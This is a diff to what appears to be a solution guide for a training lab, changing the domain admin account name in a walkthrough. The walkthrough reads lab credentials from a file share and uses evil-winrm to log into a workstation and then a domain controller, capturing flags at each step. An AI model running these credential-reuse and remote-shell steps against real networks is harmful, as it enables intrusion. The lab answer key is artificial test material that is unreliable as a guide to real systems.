@@ -7,14 +7,14 @@
    `backups/ws-creds.txt` → `CORP\wuser / Work2024!` for ws01.
 2. `evil-winrm -i <ws01> -u wuser -p 'Work2024!'` (domain user; prefix
    `.\wuser` if domain auth fails) → `C:\flags\workstation.txt` →
-   **ws-flag**; `C:\ops\dc-note.txt` → DA creds `Administrator / D@main2024!`.
-3. `evil-winrm -i <dc01> -u Administrator -p 'D@main2024!'` →
+   **ws-flag**; `C:\ops\dc-note.txt` → DA creds `adm-ops / D@main2024!`.
+3. `evil-winrm -i <dc01> -u adm-ops -p 'D@main2024!'` →
    `C:\flags\domain-admin.txt` → **dc-flag**.
 
 ## Key facts (stage 2–3 only)
 
 - Cred chain: `wuser/Work2024!` (ws01, domain user) →
-  `Administrator/D@main2024!` (DC).
+  `adm-ops/D@main2024!` (DC).
 - files01's share name is `share`; creds in `backups/ws-creds.txt`.
 - If trainees try kerberos/winrm auth failures — fall back to
   `.\wuser` local-style or `CORP\wuser` UPN forms.
